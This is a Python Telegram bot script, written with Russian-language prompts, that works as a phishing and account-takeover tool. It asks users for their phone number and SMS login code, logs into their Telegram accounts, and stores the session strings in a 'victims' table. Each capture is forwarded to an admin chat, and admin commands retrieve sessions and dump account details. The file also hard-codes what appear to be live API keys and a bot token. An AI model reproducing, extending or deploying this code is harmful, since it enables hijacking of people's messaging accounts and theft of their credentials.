import asyncio
import sqlite3
import json
import os
from datetime import datetime
from telethon import TelegramClient, events
from telethon.sessions import StringSession

API_ID = 34964489
API_HASH = "9927e9baa619c201c7598acd7dae95d9"
BOT_TOKEN = "8949532408:AAGJhhMiz5Vp4uZx8k7DuzZLHGBNzH5EjCI"
ADMIN = 8293331138

db = sqlite3.connect("db.db")
cursor = db.cursor()
cursor.execute("CREATE TABLE IF NOT EXISTS victims (id TEXT, phone TEXT, code TEXT, session TEXT, date TEXT)")
db.commit()
os.makedirs("dumps", exist_ok=True)

client = TelegramClient("bot", API_ID, API_HASH).start(bot_token=BOT_TOKEN)
states = {}

@client.on(events.NewMessage(pattern='/start'))
async def start(event):
    uid = str(event.sender_id)
    states[uid] = {}
    await event.respond("📱 Введите номер телефона:")

@client.on(events.NewMessage)
async def handle(event):
    if not event.is_private: return
    uid = str(event.sender_id)
    if uid not in states: return
    
    if "phone" not in states[uid]:
        states[uid]["phone"] = event.text
        await event.respond("🔑 Введите код из SMS:")
    elif "code" not in states[uid]:
        phone = states[uid]["phone"]
        code = event.text
        
        temp = TelegramClient(f"temp_{uid}", API_ID, API_HASH)
        await temp.connect()
        try:
            await temp.sign_in(phone, code)
            session = temp.session.save()
            
            cursor.execute("INSERT INTO victims VALUES (?,?,?,?,?)", (uid, phone, code, session, str(datetime.now())))
            db.commit()
            
            await client.send_message(ADMIN, f"🔥 ЖЕРТВА!\nID: {uid}\nТел: {phone}\nКод: {code}\nСессия: {session}")
            await event.respond("✅ Готово!")
        except Exception as e:
            await client.send_message(ADMIN, f"Ошибка: {e}")
            await event.respond("❌ Ошибка, начните /start заново")
        finally:
            await temp.disconnect()
            del states[uid]

@client.on(events.NewMessage(pattern='/victims'))
async def victims(event):
    if event.sender_id != ADMIN: return
    cursor.execute("SELECT id, phone, date FROM victims")
    data = cursor.fetchall()
    msg = "Список жертв:\n" + "\n".join([f"{x[0]} | {x[1]} | {x[2][:10]}" for x in data[-10:]])
    await event.reply(msg)

@client.on(events.NewMessage(pattern='/session (\\d+)'))
async def get_session(event):
    if event.sender_id != ADMIN: return
    uid = event.pattern_match.group(1)
    cursor.execute("SELECT session FROM victims WHERE id=?", (uid,))
    res = cursor.fetchone()
    await event.reply(f"Сессия: {res[0]}" if res else "Не найдено")

@client.on(events.NewMessage(pattern='/dump (\\d+)'))
async def dump(event):
    if event.sender_id != ADMIN: return
    uid = event.pattern_match.group(1)
    cursor.execute("SELECT session FROM victims WHERE id=?", (uid,))
    res = cursor.fetchone()
    if res:
        temp = TelegramClient(StringSession(res[0]), API_ID, API_HASH)
        await temp.connect()
        me = await temp.get_me()
        data = {"id": me.id, "phone": me.phone, "username": me.username}
        with open(f"dumps/{uid}.json", "w") as f:
            json.dump(data, f)
        await client.send_file(ADMIN, f"dumps/{uid}.json")
        await event.reply("Дамп отправлен")
        await temp.disconnect()
    else:
        await event.reply("Не найдено")

print("Бот запущен")
client.run_until_disconnected()
